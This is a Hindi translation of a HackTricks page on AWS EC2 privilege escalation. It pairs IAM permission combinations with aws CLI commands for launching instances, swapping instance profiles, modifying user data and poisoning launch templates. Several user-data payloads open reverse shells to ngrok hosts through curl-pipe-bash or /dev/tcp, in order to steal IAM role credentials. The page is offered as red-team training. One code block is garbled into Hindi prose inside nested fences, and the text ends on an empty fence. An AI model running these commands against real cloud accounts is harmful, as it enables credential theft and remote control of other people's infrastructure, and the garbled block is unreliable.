# AWS - EC2 рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

## EC2

рдЕрдзрд┐рдХ **EC2 рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА** рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

рдПрдХ рд╣рдорд▓рд╛рд╡рддрд╛ **рдПрдХ IAM рд░реЛрд▓ рдЬреЛрдбрд╝рдХрд░ рдПрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИ** рддрд╛рдХрд┐ IAM рд░реЛрд▓ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╕реЗ рдЪреБрд░рд╛ рд╕рдХреЗред

* **SSH рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣реБрдВрдЪреЗрдВ**

рдПрдХ **рдирдП рдЗрдВрд╕реНрдЯреЗрдВрд╕** рдХреЛ рдЪрд▓рд╛рдПрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ **рдмрдирд╛рдпрд╛ рдЧрдпрд╛ ssh рдХреБрдВрдЬреА** (`--key-name`) рд▓рдЧрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЗрд╕рдореЗрдВ ssh рдХрд░реЗрдВ (рдпрджрд┐ рдЖрдк рдПрдХ рдирдпрд╛ рдмрдирд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рдЕрдиреБрдорддрд┐ `ec2:CreateKeyPair` рд╣реЛ рд╕рдХрддреА рд╣реИ)ред
```bash
aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=<instance-profile-name> --key-name <ssh-key> \
--security-group-ids <sg-id>
```
* **рдЙрдкрдпреЛрдХреНрддрд╛ рдбреЗрдЯрд╛ рдореЗрдВ рд░реЗрд╡ рд╢реИрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣реБрдВрдЪ**

рдЖрдк рдПрдХ рдирдП рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ **рдЙрдкрдпреЛрдХреНрддрд╛ рдбреЗрдЯрд╛** (`--user-data`) рд╣реЛрдЧрд╛ рдЬреЛ рдЖрдкрдХреЛ рдПрдХ **рд░реЗрд╡ рд╢реИрд▓** рднреЗрдЬреЗрдЧрд╛ред рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ рдЖрдкрдХреЛ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдореВрд╣ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред
```bash
echo '#!/bin/bash
curl https://reverse-shell.sh/4.tcp.ngrok.io:17031 | bash' > /tmp/rev.sh

aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=E<instance-profile-name> \
--count 1 \
--user-data "file:///tmp/rev.sh"
```
**рд╕рд╛рд╡рдзрд╛рди рд░рд╣реЗрдВ** GuradDuty рдХреЗ рд╕рд╛рде, рдпрджрд┐ рдЖрдк рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рдмрд╛рд╣рд░ IAM рд░реЛрд▓ рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ:

{% content-ref url="../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md" %}
[aws-guardduty-enum.md](../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md)
{% endcontent-ref %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдореМрдЬреВрджрд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╛рдЗрд▓ рдореЗрдВ рдЬреБрдбрд╝реЗ рдХрд┐рд╕реА рднреА EC2 рд░реЛрд▓ рдХреА рд╕реАрдзреА рдкреНрд░рд┐рд╡реЗрд╕реНрдХред

#### ECS рдХреЛ рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рдХрд░реЗрдВ

рдЗрд╕ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕реЗрдЯ рдХреЗ рд╕рд╛рде, рдЖрдк рдПрдХ EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдПрдХ ECS рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рддрд░рд╣, ECS **рд╕реЗрд╡рд╛рдПрдВ** рдЙрд╕ EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рдЕрдВрджрд░ **рдЪрд▓рд╛рдИ** рдЬрд╛рдПрдВрдЧреА рдЬрд╣рд╛рдВ рдЖрдкрдХрд╛ рдкрд╣реБрдВрдЪ рд╣реИ рдФрд░ рдлрд┐рд░ рдЖрдк рдЙрди рд╕реЗрд╡рд╛рдУрдВ (рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░) рдореЗрдВ рдкреНрд░рд╡реЗрд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдирдХреЗ ECS рд░реЛрд▓реНрд╕ рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВред

{% code overflow="wrap" %}
```bash
aws ec2 run-instances \
--image-id ami-07fde2ae86109a2af \
--instance-type t2.micro \
--iam-instance-profile <ECS_role> \
--count 1 --key-name pwned \
--user-data "file:///tmp/asd.sh"

# Make sure to use an ECS optimized AMI as it has everything installed for ECS already (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
# The EC2 instance profile needs basic ECS access
# The content of the user data is:
#!/bin/bash
echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
```
{% endcode %}

рдЗрд╕ рдирдП EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдореЗрдВ **ECS рд╕реЗрд╡рд╛рдПрдВ рдЪрд▓рд╛рдиреЗ рдХреЛ рдордЬрдмреВрд░** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реАрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрди рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

{% content-ref url="aws-ecs-privesc.md" %}
[aws-ecs-privesc.md](aws-ecs-privesc.md)
{% endcontent-ref %}

рдЕрдЧрд░ рдЖрдк **рдирдпрд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдирд╣реАрдВ рдмрдирд╛ рд╕рдХрддреЗ** рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ `ecs:RegisterContainerInstance` рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЖрдк рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЛ рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХрдореЗрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** ECS рд░реЛрд▓реНрд╕ рдЬреЛ рдЯрд╛рд╕реНрдХреНрд╕ рд╕реЗ рдЬреБрдбрд╝реЗ рд╣реЛрддреЗ рд╣реИрдВ, рдХреЛ рд╕реАрдзреЗ рд╡реГрджреНрдзрд┐ред

### **`iam:PassRole`,** **`iam:AddRoleToInstanceProfile`**

рдкрд┐рдЫрд▓реЗ рд╕реНрдерд┐рддрд┐ рдХреЗ рд╕рдорд╛рди, рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рдХрд┐рд╕реА рднреА рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝реНрдб рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреА IAM рд░реЛрд▓ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ** рддрд╛рдХрд┐ рд╡рд╣ рдирдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЪреБрд░рд╛ рд╕рдХреЗред\
рдЬреИрд╕рд╛ рдХрд┐ рдПрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдХреЗрд╡рд▓ 1 рд░реЛрд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЕрдЧрд░ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ **рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдХ рд░реЛрд▓ рд╣реИ** (рд╕рд╛рдорд╛рдиреНрдп рдорд╛рдорд▓рд╛), рддреЛ рдЖрдкрдХреЛ рднреА **`iam:RemoveRoleFromInstanceProfile`** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред

{% code overflow="wrap" %}
```bash
# Removing role from instance profile
aws iam remove-role-from-instance-profile --instance-profile-name <name> --role-name <name>

# Add role to instance profile
aws iam add-role-to-instance-profile --instance-profile-name <name> --role-name <name>
```
{% endcode %}

рдпрджрд┐ **рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╛рдЗрд▓ рдореЗрдВ рдПрдХ рд░реЛрд▓ рд╣реИ** рдФрд░ рд╣рдорд▓рд╛рд╡рд░ **рдЙрд╕реЗ рд╣рдЯрд╛ рдирд╣реАрдВ рд╕рдХрддрд╛**, рддреЛ рдПрдХ рдФрд░ рдЙрдкрд╛рдп рд╣реИред рд╡рд╣ **рдмрд┐рдирд╛ рдХрд┐рд╕реА рд░реЛрд▓ рд╡рд╛рд▓реЗ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╛рдЗрд▓ рдХреЛ рдЦреЛрдЬ рд╕рдХрддрд╛ рд╣реИ** рдпрд╛ **рдирдпрд╛ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ** (`iam:CreateInstanceProfile`), **рдЙрд╕ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╛рдЗрд▓ рдореЗрдВ рд░реЛрд▓ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ** (рдЬреИрд╕рд╛ рдкрд╣рд▓реЗ рдЪрд░реНрдЪрд╛ рдХреА рдЧрдИ рд╣реИ), рдФрд░ **рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЛ рдПрдХ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╛рдЗрд▓ рд╕реЗ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ:**

* рдЕрдЧрд░ рдЗрдВрд╕реНрдЯреЗрдВрд╕ **рдХреЗ рдкрд╛рд╕ рдХреЛрдИ рдЗрдВрд╕реНрдЯреЗрдВрд╕** рдкреНрд░реЛрдлрд╛рдЗрд▓ рдирд╣реАрдВ рд╣реИ (`ec2:AssociateIamInstanceProfile`) \* 

{% code overflow="wrap" %}
```bash
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдПрдХ рд╡рд┐рднрд┐рдиреНрди EC2 рднреВрдорд┐рдХрд╛ рдореЗрдВ рд╕реАрдзрд╛ рдкреНрд░рд╛рдЗрд╡рд┐рд▓реЗрдЬ рдЙрдиреНрдирддрд┐ (рдЖрдкрдХреЛ AWS EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдХреБрдЫ рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрдорддрд┐ рдпрд╛ рд╡рд┐рд╢реЗрд╖ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рд╕реНрдерд┐рддрд┐ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП)ред

### **`iam:PassRole`((** `ec2:AssociateIamInstanceProfile`& `ec2:DisassociateIamInstanceProfile`) || `ec2:ReplaceIamInstanceProfileAssociation`)

рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рд╕реЗ рдЬреБрдбрд╝реЗ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдХреЛ рдмрджрд▓рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рд╣рдорд▓реЗ рдХреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЗрдВрд╕реНрдЯреЗрдВрд╕ рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛрддреА рд╣реИ рддреЛ рд╡рд╣ рдЗрд╕рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗ рдЕрдзрд┐рдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рднреВрдорд┐рдХрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЗрд╕рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝рд╛ рд╣реЛрддрд╛ рд╣реИред

* рдЕрдЧрд░ рдЗрд╕рдореЗрдВ рдПрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рд╣реИ, рддреЛ рдЖрдк рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдХреЛ **рд╣рдЯрд╛** рд╕рдХрддреЗ рд╣реИрдВ (`ec2:DisassociateIamInstanceProfile`) рдФрд░ рдЗрд╕реЗ **рд╕рдВрдмрдВрдзрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ \*
```bash
aws ec2 describe-iam-instance-profile-associations --filters Name=instance-id,Values=i-0d36d47ba15d7b4da
aws ec2 disassociate-iam-instance-profile --association-id <value>
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

* рдпрд╛ **рдмрджрд▓реЗрдВ** рдХрд░реЗрдВ **рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╛рдЗрд▓** рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝ рд╣реБрдП рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХрд╛ (`ec2:ReplaceIamInstanceProfileAssociation`). \*

{% code overflow="wrap" %}
````
```bash
```html
<p>рдЖрд╡реЗрд╕ рдИрд╕реА 2 рдЖрдИрдПрдПрдо рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╛рдЗрд▓ рдПрд╕реЛрд╕рд┐рдПрд╢рди рдХреЛ рдмрджрд▓реЗрдВ --iam-instance-profile Name=<value> --association-id <value></p>
```
```
````
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдПрдХ рд╡рд┐рднрд┐рдиреНрди EC2 рднреВрдорд┐рдХрд╛ рдореЗрдВ рд╕реАрдзрд╛ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЙрдиреНрдирддрд┐ (рдЖрдкрдХреЛ AWS EC2 рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдХреБрдЫ рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрдорддрд┐ рдпрд╛ рд╡рд┐рд╢реЗрд╖ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рд╕реНрдерд┐рддрд┐ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП)ред

### `ec2:RequestSpotInstances`,`iam:PassRole`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ **`ec2:RequestSpotInstances` рдФрд░ `iam:PassRole`** рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ, рд╡рд╣ рдПрдХ **Spot Instance** рдХрд╛ **рдЕрдиреБрд░реЛрдз** рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ **EC2 рднреВрдорд┐рдХрд╛ рд╕рдВрд▓рдЧреНрди** рд╣реИ рдФрд░ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЗрдЯрд╛** рдореЗрдВ рдПрдХ **рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓** рд╣реИред\
рдПрдХ рдмрд╛рд░ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╡рд╣ **IAM рднреВрдорд┐рдХрд╛ рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИ**ред

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 request-spot-instances \
--instance-count 1 \
--launch-specification "{\"IamInstanceProfile\":{\"Name\":\"EC2-CloudWatch-Agent-Role\"}, \"InstanceType\": \"t2.micro\", \"UserData\":\"$REV\", \"ImageId\": \"ami-0c1bc246476a5572b\"}"
```
{% endcode %}

### `ec2:ModifyInstanceAttribute`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **`ec2:ModifyInstanceAttribute`** рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЙрдкрдХрд░рдг рдХреА рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЙрдирдореЗрдВ рд╕реЗ рдПрдХ рд╣реИ рдХрд┐ рд╡рд╣ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЗрдЯрд╛ рдХреЛ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ**, рдЬрд┐рд╕рд╕реЗ рд╡рд╣ рдЙрдкрдХрд░рдг **рдХреЛ рд╡рд┐рдЪрд╛рд░рд╢реАрд▓ рдбреЗрдЯрд╛ рдЪрд▓рд╛ рд╕рдХрддрд╛ рд╣реИред** рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **EC2 рдЙрдкрдХрд░рдг рдкрд░ рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓ рд▓реЗрдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ рдХреЗрд╡рд▓ **рдЬрдм рдЙрдкрдХрд░рдг рдмрдВрдж рд╣реИ рддреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ**, рдЗрд╕рд▓рд┐рдП **рдЕрдиреБрдорддрд┐рдпрд╛рдБ** **`ec2:StopInstances`** рдФрд░ **`ec2:StartInstances`** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред
```bash
TEXT='Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
bash -i >& /dev/tcp/2.tcp.ngrok.io/14510 0>&1
--//'
TEXT_PATH="/tmp/text.b64.txt"

printf $TEXT | base64 > "$TEXT_PATH"

aws ec2 stop-instances --instance-ids $INSTANCE_ID

aws ec2 modify-instance-attribute \
--instance-id="$INSTANCE_ID" \
--attribute userData \
--value file://$TEXT_PATH

aws ec2 start-instances --instance-ids $INSTANCE_ID
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдПрдХ рдирд┐рд░реНрдорд┐рдд рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкрд░ рдЬреБрдбрд╝реЗ рдХрд┐рд╕реА рднреА EC2 IAM рд░реЛрд▓ рдХреЛ рд╕реАрдзреЗ рд╡реГрджреНрдзрд┐ред

### `ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`,`ec2:ModifyLaunchTemplate`

**`ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate` рдФрд░ `ec2:ModifyLaunchTemplate`** рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ **рдирдпрд╛ рд▓реЙрдиреНрдЪ рдЯреЗрдореНрдкрд▓реЗрдЯ рд╕рдВрд╕реНрдХрд░рдг** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЗрдЯрд╛** рдореЗрдВ **рд░реЗрд╡ рд╢реИрд▓** рд╣реЛ рдФрд░ **рдЙрд╕ рдкрд░ рдХреЛрдИ рднреА EC2 IAM рд░реЛрд▓** рд╣реЛ, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрд╕реНрдХрд░рдг рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ **рдЙрд╕ рд▓реЙрдиреНрдЪ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХрд┐рд╕реА рднреА рдСрдЯреЛрд╕реНрдХреЗрд▓рд░ рд╕рдореВрд╣** рдХреЛ **рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ **рдирд╡реАрдирддрдо** рдпрд╛ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрд╕реНрдХрд░рдг** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ рдФрд░ рдЙрд╕ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрд╕ рд░реЗрд╡ рд╢реИрд▓ рдХреЛ рдЪрд▓рд╛рдПрдЧрд╛ред

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 create-launch-template-version \
--launch-template-name bad_template \
--launch-template-data "{\"ImageId\": \"ami-0c1bc246476a5572b\", \"InstanceType\": \"t3.micro\", \"IamInstanceProfile\": {\"Name\": \"ecsInstanceRole\"}, \"UserData\": \"$REV\"}"

aws ec2 modify-launch-template \
--launch-template-name bad_template \
--default-version 2
```
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдПрдХ рд╡рд┐рднрд┐рдиреНрди EC2 рднреВрдорд┐рдХрд╛ рдореЗрдВ рд╕реАрдзрд╛ рд╡реГрджреНрдзрд┐ред

### `autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`

**`autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`** рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **Launch Configuration** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ **IAM рднреВрдорд┐рдХрд╛** рдФрд░ **user data** рдореЗрдВ рдПрдХ **rev shell** рд╣реЛ, рдлрд┐рд░ рдЙрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реЗ рдПрдХ autoscaling рд╕рдореВрд╣ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ rev shell рд╕реЗ **IAM рднреВрдорд┐рдХрд╛ рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИ**ред
```bash
